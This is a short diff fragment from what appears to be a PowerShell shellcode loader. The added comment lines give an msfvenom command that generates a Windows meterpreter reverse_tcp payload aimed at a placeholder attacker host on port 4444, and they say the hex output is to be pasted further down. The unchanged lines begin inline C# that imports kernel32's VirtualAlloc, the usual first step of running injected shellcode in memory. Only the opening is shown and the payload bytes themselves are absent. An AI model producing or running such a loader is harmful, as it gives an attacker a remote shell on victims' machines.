@@ -1,3 +1,7 @@
+# Shellcode Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f powershell
+# Hex output goes to line 19
+
+
 $code = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
